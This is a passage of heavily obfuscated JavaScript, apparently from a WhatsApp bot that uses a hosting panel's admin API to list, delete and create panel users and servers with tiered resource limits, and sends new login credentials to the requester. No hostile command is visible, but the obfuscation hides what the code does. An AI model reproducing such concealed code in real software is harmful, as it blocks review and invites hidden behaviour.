                    if (_0x2a5309[_0x366535(0x10aa)](_0x4e2fa8[_0x366535(0x7f4)]['id'], _0x5c5935[0x3 * 0x1c1 + -0xe05 + -0x13 * -0x76]) && _0x2a5309[_0x366535(0x10aa)](_0x4e2fa8[_0x366535(0x7f4)][_0x366535(0x1084)], !![])) {
                        _0x56afbb = _0x4e2fa8[_0x366535(0x7f4)][_0x366535(0x1104)], _0x45ca7a = _0x4e2fa8[_0x366535(0x7f4)]['id'];
                        let _0x231c38 = await _0x2a5309[_0x366535(0xac3)](fetch, _0x2a5309[_0x366535(0x2d2)](domainV2, _0x366535(0x958) + _0x366535(0xb86) + _0x366535(0x1052) + _0x45ca7a), {
                                'method': _0x2a5309[_0x366535(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x366535(0xe03)],
                                    'Content-Type': _0x2a5309[_0x366535(0xe03)],
                                    'Authorization': _0x2a5309[_0x366535(0x2d2)](_0x2a5309[_0x366535(0xbee)], apikeyV2)
                                }
                            }), _0x5c30ad = _0x231c38['ok'] ? { 'errors': null } : await _0x231c38[_0x366535(0x728)]();
                    }
                });
                if (_0x2a5309[_0x5d4417(0xbb9)](_0x45ca7a, null))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x651)]);
                await _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0xf9d) + _0x5d4417(0x87c) + _0x5d4417(0x814) + _0x2a5309[_0x5d4417(0xf7c)](capital, _0x56afbb) + '*');
            }
            break;
        case _0x2a5309[_0x5d4417(0xf3b)]: {
                if (_0x2a5309[_0x5d4417(0x24e)](!_0x47f98c, !_0x73fd3b))
                    return _0x2a5309[_0x5d4417(0x304)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97) {
                    let _0x3a5304 = [], _0x836c4e = await _0x2a5309[_0x5d4417(0x9c7)](fetch, _0x2a5309[_0x5d4417(0x7ea)](domainV2, _0x2a5309[_0x5d4417(0xdf3)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0xae4)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                            }
                        }), _0x292238 = await _0x836c4e[_0x5d4417(0x728)](), _0x206d5c = _0x292238[_0x5d4417(0x1059)];
                    if (_0x2a5309[_0x5d4417(0x4c8)](_0x206d5c[_0x5d4417(0xf65)], -0x15e + -0x14eb + 0x164a))
                        return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x10a4)]);
                    for (let _0x56be65 of _0x206d5c) {
                        let _0x3c2875 = _0x56be65[_0x5d4417(0x7f4)], _0x38e356 = await _0x2a5309[_0x5d4417(0xb38)](fetch, _0x2a5309[_0x5d4417(0xf6d)](_0x2a5309[_0x5d4417(0x44d)](_0x2a5309[_0x5d4417(0xa3f)](domainV2, _0x2a5309[_0x5d4417(0xedb)]), _0x3c2875[_0x5d4417(0x60c)][_0x5d4417(0xc6c)]`-`[0x1 * 0x2603 + -0x737 + -0x522 * 0x6]), _0x2a5309[_0x5d4417(0xc92)]), {
                                'method': _0x2a5309[_0x5d4417(0xea5)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x1048)](_0x2a5309[_0x5d4417(0xbee)], capikeyV2)
                                }
                            }), _0x4c84d0 = await _0x38e356[_0x5d4417(0x728)](), _0x42aa4d = _0x4c84d0[_0x5d4417(0x7f4)] ? _0x4c84d0[_0x5d4417(0x7f4)][_0x5d4417(0x986) + _0x5d4417(0x10f4)] : _0x3c2875[_0x5d4417(0x466)];
                        _0x3a5304[_0x5d4417(0x706)]({
                            'title': _0x3c2875[_0x5d4417(0x277)] + _0x5d4417(0xd97) + _0x3c2875['id'] + ')',
                            'description': _0x5d4417(0x649) + (_0x2a5309[_0x5d4417(0x837)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)], 0x10aa * -0x2 + 0x107a + 0x10da) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xd0b)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], -0x1d57 * 0x1 + 0x202d * 0x1 + -0x2d2) ? _0x2a5309[_0x5d4417(0xce3)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x2 * -0x133 + -0x2 * -0xc74 + 0xda7 * -0x2, -0x1e8d * -0x1 + -0xa52 * -0x3 + 0x43 * -0xeb)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x26b)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xf65)], -0x7 * -0x20b + -0x1 * 0x2291 + 0x1448 * 0x1) ? _0x2a5309[_0x5d4417(0x1018)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x237b + -0xaa + 0x2 * -0x1168), 'GB') : _0x2a5309[_0x5d4417(0x1027)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x10b9)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](-0x1069 * -0x1 + 0x1e0d * 0x1 + -0x1 * 0x2e76), 'GB')) + _0x5d4417(0xd9d) + (_0x2a5309[_0x5d4417(0xc74)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0xd81)], 0x1d84 + 0x8f * 0x16 + -0x29ce) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xedf)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xf65)], 0x519 + -0x2258 + 0x1d42) ? _0x2a5309[_0x5d4417(0x7ea)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](-0x984 + -0x2cf * -0x1 + 0x6b6), 'GB') : _0x2a5309[_0x5d4417(0x3d1)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0xd81)][_0x5d4417(0xef4)]()[_0x5d4417(0xff0)](0x2bd + -0x23ac + 0x1 * 0x20ef), 'GB')) + _0x5d4417(0x326) + (_0x2a5309[_0x5d4417(0x1200)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)], 0x8c6 + 0x1440 + -0x1d06) ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x7a7)](_0x3c2875[_0x5d4417(0x2a8)][_0x5d4417(0x5ce)][_0x5d4417(0xef4)](), '%')),
                            'id': _0x5d4417(0xd79) + _0x5d4417(0x64f) + _0x3c2875['id']
                        });
                    }
                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0x9d3)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x378)],
                                                'rows': [..._0x3a5304]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0xc95)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x44d)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                }
                let _0x47e61d = await _0x2a5309[_0x5d4417(0xfaf)](fetch, _0x2a5309[_0x5d4417(0x709)](domainV2, _0x2a5309[_0x5d4417(0xdf3)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x10f0)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x23b492 = await _0x47e61d[_0x5d4417(0x728)](), _0x482375 = _0x23b492[_0x5d4417(0x1059)], _0x2c1625, _0x34f1b4;
                for (let _0x59177f of _0x482375) {
                    let _0x548d3e = _0x59177f[_0x5d4417(0x7f4)];
                    if (_0x2a5309[_0x5d4417(0xbb0)](_0x2a5309[_0x5d4417(0x710)](Number, _0x156b97), _0x548d3e['id'])) {
                        _0x2c1625 = _0x548d3e[_0x5d4417(0x277)][_0x5d4417(0xec1) + 'e'](), _0x34f1b4 = _0x548d3e[_0x5d4417(0x277)];
                        let _0x462a23 = await _0x2a5309[_0x5d4417(0x845)](fetch, _0x2a5309[_0x5d4417(0x3e6)](domainV2, _0x5d4417(0x958) + _0x5d4417(0xf8f) + _0x5d4417(0x34e) + _0x548d3e['id']), {
                                'method': _0x2a5309[_0x5d4417(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x7ea)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                                }
                            }), _0x398b9c = _0x462a23['ok'] ? { 'errors': null } : await _0x462a23[_0x5d4417(0x728)]();
                    }
                }
                let _0x42bd2b = await _0x2a5309[_0x5d4417(0xb38)](fetch, _0x2a5309[_0x5d4417(0xbe4)](domainV2, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x532)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                        }
                    }), _0x27cc3e = await _0x42bd2b[_0x5d4417(0x728)](), _0x425de2 = _0x27cc3e[_0x5d4417(0x1059)];
                for (let _0x60a419 of _0x425de2) {
                    let _0x10ce15 = _0x60a419[_0x5d4417(0x7f4)];
                    if (_0x2a5309[_0x5d4417(0x91e)](_0x10ce15[_0x5d4417(0xcf9)][_0x5d4417(0xec1) + 'e'](), _0x2c1625)) {
                        let _0x26c05f = await _0x2a5309[_0x5d4417(0xf4a)](fetch, _0x2a5309[_0x5d4417(0xdfe)](domainV2, _0x5d4417(0x958) + _0x5d4417(0xb86) + _0x5d4417(0x1052) + _0x10ce15['id']), {
                                'method': _0x2a5309[_0x5d4417(0x988)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x1078)](_0x2a5309[_0x5d4417(0xbee)], apikeyV2)
                                }
                            }), _0x54529c = _0x26c05f['ok'] ? { 'errors': null } : await _0x26c05f[_0x5d4417(0x728)]();
                    }
                }
                if (_0x2a5309[_0x5d4417(0x1008)](_0x2c1625, undefined))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x370)]);
                _0xedb653[_0x5d4417(0x105d)](_0x5d4417(0x11b9) + _0x5d4417(0x8b6) + _0x5d4417(0x10a1) + _0x5d4417(0xd1d) + _0x2a5309[_0x5d4417(0x10a3)](capital, _0x34f1b4) + '*');
            }
            break;
        case _0x2a5309[_0x5d4417(0x8a8)]:
        case _0x2a5309[_0x5d4417(0x636)]:
        case _0x2a5309[_0x5d4417(0x612)]:
        case _0x2a5309[_0x5d4417(0xd12)]:
        case _0x2a5309[_0x5d4417(0x10be)]:
        case _0x2a5309[_0x5d4417(0xe94)]:
        case _0x2a5309[_0x5d4417(0x1141)]:
        case _0x2a5309[_0x5d4417(0xbd1)]:
        case _0x2a5309[_0x5d4417(0xf56)]:
        case _0x2a5309[_0x5d4417(0x914)]:
        case _0x2a5309[_0x5d4417(0x344)]:
        case _0x2a5309[_0x5d4417(0x70e)]: {
                if (_0x2a5309[_0x5d4417(0x24e)](!_0x47f98c, !_0x73fd3b))
                    return _0x2a5309[_0x5d4417(0xe5d)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x53a)](_0x1ac933, _0x2a5309[_0x5d4417(0xaa8)]));
                global[_0x5d4417(0x594)] = _0x156b97;
                var _0x42598a, _0x1193a1, _0x1de043;
                if (_0x2a5309[_0x5d4417(0x929)](_0x224056, _0x2a5309[_0x5d4417(0x8a8)]))
                    _0x42598a = _0x2a5309[_0x5d4417(0xdd3)], _0x1193a1 = _0x2a5309[_0x5d4417(0xdd3)], _0x1de043 = '40';
                else {
                    if (_0x2a5309[_0x5d4417(0xd1f)](_0x224056, _0x2a5309[_0x5d4417(0x636)]))
                        _0x42598a = _0x2a5309[_0x5d4417(0xc6f)], _0x1193a1 = _0x2a5309[_0x5d4417(0xdd3)], _0x1de043 = '60';
                    else {
                        if (_0x2a5309[_0x5d4417(0x351)](_0x224056, _0x2a5309[_0x5d4417(0x612)]))
                            _0x42598a = _0x2a5309[_0x5d4417(0x1d1)], _0x1193a1 = _0x2a5309[_0x5d4417(0xc6f)], _0x1de043 = '80';
                        else {
                            if (_0x2a5309[_0x5d4417(0xb58)](_0x224056, _0x2a5309[_0x5d4417(0xd12)]))
                                _0x42598a = _0x2a5309[_0x5d4417(0xb88)], _0x1193a1 = _0x2a5309[_0x5d4417(0xc6f)], _0x1de043 = _0x2a5309[_0x5d4417(0x5f8)];
                            else {
                                if (_0x2a5309[_0x5d4417(0xacc)](_0x224056, _0x2a5309[_0x5d4417(0x10be)]))
                                    _0x42598a = _0x2a5309[_0x5d4417(0xd59)], _0x1193a1 = _0x2a5309[_0x5d4417(0x1d1)], _0x1de043 = _0x2a5309[_0x5d4417(0x6e5)];
                                else {
                                    if (_0x2a5309[_0x5d4417(0xe0a)](_0x224056, _0x2a5309[_0x5d4417(0xe94)]))
                                        _0x42598a = _0x2a5309[_0x5d4417(0x67b)], _0x1193a1 = _0x2a5309[_0x5d4417(0x1d1)], _0x1de043 = _0x2a5309[_0x5d4417(0xfec)];
                                    else {
                                        if (_0x2a5309[_0x5d4417(0x2ef)](_0x224056, _0x2a5309[_0x5d4417(0x1141)]))
                                            _0x42598a = _0x2a5309[_0x5d4417(0xc89)], _0x1193a1 = _0x2a5309[_0x5d4417(0xb88)], _0x1de043 = _0x2a5309[_0x5d4417(0x46b)];
                                        else {
                                            if (_0x2a5309[_0x5d4417(0xf0c)](_0x224056, _0x2a5309[_0x5d4417(0xbd1)]))
                                                _0x42598a = _0x2a5309[_0x5d4417(0xdec)], _0x1193a1 = _0x2a5309[_0x5d4417(0xb88)], _0x1de043 = _0x2a5309[_0x5d4417(0x4d2)];
                                            else {
                                                if (_0x2a5309[_0x5d4417(0x11fe)](_0x224056, _0x2a5309[_0x5d4417(0xf56)]))
                                                    _0x42598a = _0x2a5309[_0x5d4417(0x11ed)], _0x1193a1 = _0x2a5309[_0x5d4417(0xd59)], _0x1de043 = _0x2a5309[_0x5d4417(0x596)];
                                                else
                                                    _0x2a5309[_0x5d4417(0xb4e)](_0x224056, _0x2a5309[_0x5d4417(0x914)]) ? (_0x42598a = _0x2a5309[_0x5d4417(0x111f)], _0x1193a1 = _0x2a5309[_0x5d4417(0xd59)], _0x1de043 = _0x2a5309[_0x5d4417(0x523)]) : (_0x42598a = '0', _0x1193a1 = '0', _0x1de043 = '0');
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                let _0x30e1d8 = global[_0x5d4417(0x594)][_0x5d4417(0xec1) + 'e'](), _0x241926 = _0x2a5309[_0x5d4417(0x2f7)](_0x30e1d8, _0x2a5309[_0x5d4417(0x1082)]), _0x4a8c76 = _0x2a5309[_0x5d4417(0xb8a)](_0x2a5309[_0x5d4417(0x103c)](capital, _0x30e1d8), _0x2a5309[_0x5d4417(0x865)]), _0x3d050a = _0x2a5309[_0x5d4417(0xf02)](_0x30e1d8, crypto[_0x5d4417(0xda8) + 's'](-0x2e * -0x1 + -0x55 + -0x1 * -0x29)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)])), _0x18ca42 = await _0x2a5309[_0x5d4417(0x591)](fetch, _0x2a5309[_0x5d4417(0xaf3)](domain, _0x2a5309[_0x5d4417(0x9d4)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x6cc)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'email': _0x241926,
                            'username': _0x30e1d8[_0x5d4417(0xec1) + 'e'](),
                            'first_name': _0x4a8c76,
                            'last_name': _0x2a5309[_0x5d4417(0x366)],
                            'language': 'en',
                            'password': _0x3d050a[_0x5d4417(0xef4)]()
                        })
                    }), _0x287578 = await _0x18ca42[_0x5d4417(0x728)]();
                if (_0x287578[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x287578[_0x5d4417(0x7e1)][-0x1c4 * 0x16 + 0x1 * -0x10d7 + 0x5 * 0xb23], null, 0x216f + 0x36f * -0x4 + -0x13b1));
                let _0x33b46c = _0x287578[_0x5d4417(0x7f4)], _0x5ac015 = _0x2a5309[_0x5d4417(0x61f)](tanggal, Date[_0x5d4417(0xc8a)]()), _0x240f7e = _0x33b46c['id'], _0x13f8f9 = await _0x2a5309[_0x5d4417(0x37c)](fetch, _0x2a5309[_0x5d4417(0x65e)](_0x2a5309[_0x5d4417(0x1048)](domain, _0x5d4417(0x958) + _0x5d4417(0x61c) + _0x5d4417(0x95c) + nestid + _0x5d4417(0x36c)), egg), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x34b)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x4da511 = await _0x13f8f9[_0x5d4417(0x728)](), _0x52c4a2 = _0x4da511[_0x5d4417(0x7f4)][_0x5d4417(0x7ae)], _0x3ecbb1 = await _0x2a5309[_0x5d4417(0x936)](fetch, _0x2a5309[_0x5d4417(0x1078)](domain, _0x2a5309[_0x5d4417(0x6bf)]), {
                        'method': _0x2a5309[_0x5d4417(0x3a6)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x343)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        },
                        'body': JSON[_0x5d4417(0x78f)]({
                            'name': _0x4a8c76,
                            'description': _0x5ac015,
                            'user': _0x240f7e,
                            'egg': _0x2a5309[_0x5d4417(0x710)](parseInt, egg),
                            'docker_image': _0x2a5309[_0x5d4417(0x1189)],
                            'startup': _0x52c4a2,
                            'environment': {
                                'INST': _0x2a5309[_0x5d4417(0x483)],
                                'USER_UPLOAD': '0',
                                'AUTO_UPDATE': '0',
                                'CMD_RUN': _0x2a5309[_0x5d4417(0x3bb)]
                            },
                            'limits': {
                                'memory': _0x42598a,
                                'swap': 0x0,
                                'disk': _0x1193a1,
                                'io': 0x1f4,
                                'cpu': _0x1de043
                            },
                            'feature_limits': {
                                'databases': 0x5,
                                'backups': 0x5,
                                'allocations': 0x5
                            },
                            'deploy': {
                                'locations': [_0x2a5309[_0x5d4417(0xccd)](parseInt, loc)],
                                'dedicated_ip': ![],
                                'port_range': []
                            }
                        })
                    }), _0x1f9f00 = await _0x3ecbb1[_0x5d4417(0x728)]();
                if (_0x1f9f00[_0x5d4417(0x7e1)])
                    return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x1f9f00[_0x5d4417(0x7e1)][0x1603 + 0x1 * -0x15a5 + 0x2f * -0x2], null, 0xd30 + 0x528 + -0x1256));
                let _0x157694 = _0x1f9f00[_0x5d4417(0x7f4)];
                var _0x16d8bc;
                _0xedb653[_0x5d4417(0xe3e)] ? (_0x16d8bc = _0xedb653[_0x5d4417(0xeee)], await _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xbd4)])) : _0x16d8bc = _0xedb653[_0x5d4417(0x9e2)];
                var _0x4417bc = _0x5d4417(0x72a) + _0x5d4417(0x1158) + _0x5d4417(0x4f4) + _0x5d4417(0x5fd) + _0x157694['id'] + (_0x5d4417(0x336) + _0x5d4417(0xfa1)) + _0x33b46c[_0x5d4417(0x1104)] + (_0x5d4417(0xc9e) + _0x5d4417(0x519)) + _0x3d050a + (_0x5d4417(0xbed) + _0x5d4417(0x8bc) + _0x5d4417(0xef6) + _0x5d4417(0x34d)) + (_0x2a5309[_0x5d4417(0x1010)](_0x42598a, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xdeb)](_0x42598a[_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0xbb7 + -0x1cdb + 0x2896) ? _0x2a5309[_0x5d4417(0x2ab)](_0x42598a[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x25f1 + 0x2057 + 0x1 * 0x59a, -0xcc5 + 0x5ad * 0x1 + -0x25e * -0x3)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x616)](_0x42598a[_0x5d4417(0xff0)](-0x6a3 + -0x2333 * 0x1 + -0x11 * -0x276), 'GB')) + (_0x5d4417(0x306) + '\x20*') + (_0x2a5309[_0x5d4417(0x309)](_0x1193a1, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x5e0)](_0x1193a1[_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0x83 * -0x32 + -0x1 * 0x1adf + -0x9 * -0x25) ? _0x2a5309[_0x5d4417(0x388)](_0x1193a1[_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x1aee + -0xb74 + 0x2 * 0x1331, -0x13e9 + -0x4 * -0x44d + 0x2b7)[_0x5d4417(0x8b2)](''), 'GB') : _0x2a5309[_0x5d4417(0x3e6)](_0x1193a1[_0x5d4417(0xff0)](-0x2 * 0xdc4 + -0x55a + -0x17 * -0x16e), 'GB')) + (_0x5d4417(0x10ca) + '*') + (_0x2a5309[_0x5d4417(0x5c0)](_0x1de043, '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x3be)](_0x1de043, '%')) + _0x5d4417(0x774) + global[_0x5d4417(0xed6)] + (_0x5d4417(0xa56) + _0x5d4417(0x78d) + _0x5d4417(0xcd5) + _0x5d4417(0x637) + _0x5d4417(0x6c4) + _0x5d4417(0x533) + _0x5d4417(0x9e7) + _0x5d4417(0x2f0) + _0x5d4417(0x714) + _0x5d4417(0xcf6) + _0x5d4417(0x5d6) + _0x5d4417(0x9fd) + _0x5d4417(0xab4) + _0x5d4417(0x853) + _0x5d4417(0x1ef));
                await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x727)], _0x4417bc), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                    'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                    'fileName': _0x2a5309[_0x5d4417(0x727)],
                    'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                    'caption': _0x4417bc
                }, { 'quoted': _0xedb653 }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]), delete global[_0x5d4417(0x594)];
            }
            break;
        case _0x2a5309[_0x5d4417(0xba4)]: {
                if (_0x2a5309[_0x5d4417(0x24e)](!_0x47f98c, !_0x73fd3b))
                    return _0x2a5309[_0x5d4417(0x338)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x22a265 = await _0x2a5309[_0x5d4417(0x736)](fetch, _0x2a5309[_0x5d4417(0x7f9)](domain, _0x2a5309[_0x5d4417(0xa1e)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0x3e6)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x2d9e2e = await _0x22a265[_0x5d4417(0x728)](), _0x3902bc = _0x2d9e2e[_0x5d4417(0x1059)];
                if (_0x2a5309[_0x5d4417(0x4c8)](_0x3902bc[_0x5d4417(0xf65)], 0x6ec + 0x176c + -0x1e57 * 0x1))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1021)]);
                var _0x4417bc = _0x2a5309[_0x5d4417(0x2af)];
                await _0x3902bc[_0x5d4417(0x102c)](_0x22341f => {
                    const _0x55130b = _0x5d4417;
                    if (_0x2a5309[_0x55130b(0x464)](_0x22341f[_0x55130b(0x7f4)][_0x55130b(0x1084)], !![]))
                        return;
                    _0x4417bc += _0x55130b(0x190) + _0x22341f[_0x55130b(0x7f4)]['id'] + (_0x55130b(0xf6b) + '\x20*') + _0x22341f[_0x55130b(0x7f4)][_0x55130b(0xcf9)] + (_0x55130b(0x1143) + _0x55130b(0xe76)) + _0x22341f[_0x55130b(0x7f4)][_0x55130b(0xaa4)][_0x55130b(0xc6c)]('T')[-0x9c0 + 0x2 * 0x12ef + 0x76 * -0x3d] + '\x0a';
                }), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'buttons': [{
                            'buttonId': _0x5d4417(0x437),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0xf2c)] },
                            'type': 0x1
                        }],
                    'footer': _0x5d4417(0xee4) + botname,
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'text': _0x4417bc,
                    'contextInfo': {
                        'isForwarded': !![],
                        'mentionedJid': [
                            _0xedb653[_0x5d4417(0xeee)],
                            _0x2a5309[_0x5d4417(0x68c)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                        ]
                    }
                }, { 'quoted': _0xedb653 });
            }
            break;
        case _0x2a5309[_0x5d4417(0x1000)]:
        case _0x2a5309[_0x5d4417(0xc25)]:
        case _0x2a5309[_0x5d4417(0x1c7)]: {
                if (_0x2a5309[_0x5d4417(0x6d8)](!_0x47f98c, !_0x73fd3b))
                    return _0x2a5309[_0x5d4417(0x3f9)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x2f0afa = await _0x2a5309[_0x5d4417(0xf4a)](fetch, _0x2a5309[_0x5d4417(0x1126)](domain, _0x2a5309[_0x5d4417(0xdf3)]), {
                        'method': _0x2a5309[_0x5d4417(0xea5)],
                        'headers': {
                            'Accept': _0x2a5309[_0x5d4417(0xe03)],
                            'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                            'Authorization': _0x2a5309[_0x5d4417(0xf5f)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                        }
                    }), _0x245d79 = await _0x2f0afa[_0x5d4417(0x728)](), _0x33ec1c = _0x245d79[_0x5d4417(0x1059)];
                if (_0x2a5309[_0x5d4417(0x26b)](_0x33ec1c[_0x5d4417(0xf65)], -0x3ab + 0x24c4 + -0x161 * 0x18))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x10a4)]);
                let _0xb9c774 = _0x2a5309[_0x5d4417(0x89d)];
                for (let _0xd9c7cd of _0x33ec1c) {
                    let _0x4f8f15 = _0xd9c7cd[_0x5d4417(0x7f4)], _0x136754 = await _0x2a5309[_0x5d4417(0x1047)](fetch, _0x2a5309[_0x5d4417(0x3f4)](_0x2a5309[_0x5d4417(0x687)](_0x2a5309[_0x5d4417(0x3f4)](domain, _0x2a5309[_0x5d4417(0xedb)]), _0x4f8f15[_0x5d4417(0x60c)][_0x5d4417(0xc6c)]`-`[0x21 * -0x1d + 0x23e3 + -0x2026]), _0x2a5309[_0x5d4417(0xc92)]), {
                            'method': _0x2a5309[_0x5d4417(0xea5)],
                            'headers': {
                                'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                'Authorization': _0x2a5309[_0x5d4417(0x2b3)](_0x2a5309[_0x5d4417(0xbee)], capikey)
                            }
                        }), _0x6d90bd = await _0x136754[_0x5d4417(0x728)](), _0x4b2ddf = _0x6d90bd[_0x5d4417(0x7f4)] ? _0x6d90bd[_0x5d4417(0x7f4)][_0x5d4417(0x986) + _0x5d4417(0x10f4)] : _0x4f8f15[_0x5d4417(0x466)];
